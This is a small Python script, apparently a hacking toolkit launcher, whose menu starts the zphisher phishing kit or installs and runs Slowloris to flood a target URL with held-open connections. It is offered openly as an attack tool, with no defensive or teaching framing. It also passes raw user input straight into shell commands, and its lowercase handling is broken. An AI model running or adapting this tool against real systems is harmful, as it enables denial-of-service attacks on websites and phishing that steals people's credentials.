import os
import sys
##################################### starting of Start_me function################

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow
version = '1.0'


def start_me():
    os.system('clear')
    banner = r'''
    < Howdy Fellow Hacker >
    ---------------------
         \  ^__^    /
          \ (oo)\__/_____
            (__)\        )\/\
                ||----w |
                ||     ||
                              '''
    print(R + banner + W + '\n')
    print(R + '[>] ' + R + 'Version : ' + W + version)


start_me()
#################################### End of Start-me function####################


#################################### main_calling################################
################ zphisher################
def zphisher():
    os.system('cd zphisher && sudo ./zphisher.sh')
    # os.system('')
################ zphisher EOC############

################ slowloric###############


def slowloric():
    # check for installation
    if os.system('pip freeze | grep Slowloris ') != 0:
        os.system('sudo pip3 install slowloris')
    else:
        prt_auth = input(G + "[>] Do you want a specific port number[Y/N] : ")
        prt_auth.lower()
        if prt_auth == 'y':
            prt = input(W + "Enter Port Number: ")
            urls = input(
                R + "Enter target URL Eg:- www.example.com \n [>] URL:- ")
            sockets = input("Enter number of sockets [1-1000]:- ")
            command = "slowloris -u "+urls + " -p " + prt + " -s "+sockets
            verb(command)
        else:
            urls = input(
                R + "Enter target URL Eg:- www.example.com \n [>] URL:- ")
            sockets = input("Enter number of sockets [1-1000]:- ")
            command = "slowloris -u "+urls + " -s "+sockets
            verb(command)
    # verbosity

def verb(command):
    verbosity = input(W+"Do you want to enable verbose mode[Y/N]:- ")
    verbosity.lower()
    if verbosity == "y":
        newcmd = command+" -v"
        commands(newcmd)
    if verbosity == "n":
        commands(command)

def commands(cmds):
    print(cmds)
    os.system(cmds)
############### slowloric EOC#############


def main_calling():
    print(W+"Press 1 for pishing attack")
    print(W+"Press 2 for DDOS attack")
    a = input("\n Enter your choice: ")
    if a == '1':
        zphisher()
    elif a == '2':
        slowloric()


main_calling()
